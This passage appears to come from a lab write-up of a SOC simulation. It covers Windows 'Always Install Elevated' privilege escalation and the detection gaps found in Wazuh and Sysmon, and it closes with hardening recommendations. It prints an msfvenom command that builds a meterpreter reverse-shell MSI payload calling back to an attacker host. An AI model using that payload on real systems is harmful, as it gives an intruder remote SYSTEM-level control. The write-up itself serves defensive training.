...
Always Install Elevated is a well-documented and widely encountered misconfiguration in real enterprise environments. It typically originates from a legitimate operational need: administrators enabling it so that standard users can install approved software without calling IT, without understanding the security implication. In domain environments, it is frequently applied via a domain-wide GPO, potentially exposing every managed endpoint simultaneously. Unlike a software vulnerability, it requires no patch and no CVE. It is a deliberate configuration choice that creates an unconditional privilege escalation path for any user on the machine. It appears in CIS Microsoft Windows benchmarks as an explicit control to audit and disable, is a staple of real-world penetration test reports, and is a core technique covered in OSCP. Its prevalence makes it one of the most practically relevant local privilege escalation techniques a SOC analyst is likely to encounter.
...
![SOCUser creation](screenshots/setup/setup-socuser-creation.png)
...
**Result:** The file downloaded successfully but Windows Defender blocked execution, quarantining it as a known offensive tool. Standard enumeration tools carry well-known signatures and are frequently caught by modern AV, so the attacker adapted to manual enumeration.
...
Following the winPEAS block, the attacker queried the two registry keys that indicate Always Install Elevated is active.
...
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.10 LPORT=4444 -f msi -o /home/kali/Desktop/update.msi
```
...
Phase 2 is significantly cleaner, with a single MSI download and a single successful meterpreter session, reflecting the clean re-run after snapshot restoration. The RDP traffic on port 3389 is clearly visible, capturing the SOCUser session from which the attack was launched.
...
|---------|----------|---------|
| Privilege escalation to SYSTEM via Always Install Elevated | Critical | Standard user SOCUser escalated to NT AUTHORITY\SYSTEM by executing a crafted MSI payload. No vulnerability exploited. Windows' own installer mechanism was abused via misconfiguration. |
...
The central finding of this simulation is not the privilege escalation itself. Always Install Elevated is a well-documented technique. What the two-phase comparison reveals is the relationship between monitoring configuration and detection capability.
...
| Sysmon not ingested by default | Add Sysmon event channel to all Wazuh agent `ossec.conf` files: `<localfile><location>Microsoft-Windows-Sysmon/Operational</location><log_format>eventchannel</log_format></localfile>` | High |
...
Sysmon was running and logging correctly throughout Phase 1. The SIEM appeared functional. The gap was invisible until actively investigated, a missing `<localfile>` entry absent from default Wazuh agent configurations. This is the kind of gap that exists silently in real environments and is only discovered during an incident or a deliberate audit.
